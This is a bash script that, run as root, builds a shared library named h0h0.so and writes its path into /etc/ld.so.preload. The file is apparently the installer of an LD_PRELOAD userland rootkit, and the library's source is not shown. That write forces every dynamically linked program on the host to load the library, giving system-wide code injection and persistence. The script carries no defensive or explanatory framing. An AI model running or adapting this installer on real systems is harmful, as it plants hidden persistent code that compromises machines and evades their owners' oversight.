#!/bin/bash

OUTFILE="$PWD/h0h0.so"
SUCCESS='\e[1m\e[32msuccessful\e[0m.'
FAILED='\e[1m\e[31mfailed\e[0m.'

if [ "$(id -u)" != '0' ]; then
    echo 'You need to be root, ya dard.' 1>&2
    exit 1
fi

# I'm an eye-candy kinda guy...
echo -e '\n\e[1m\e[31m[ Configuration ]\e[0m'
echo '-------------------'
egrep '^\s*#define' config.h | awk '{printf "%s: %s\n", $2, $3}'
echo -e '-------------------\n\n'

make clean
make

if [ -f $OUTFILE ]; then
    echo $OUTFILE > /etc/ld.so.preload
    echo -e "[+] Installation $SUCCESS\n";
else
    echo "[+] ** $OUTFILE not found; cannot write to /etc/ld.so.preload. **\n" 1>&2;
    echo -e "[+] Installation $FAILED\n";
fi
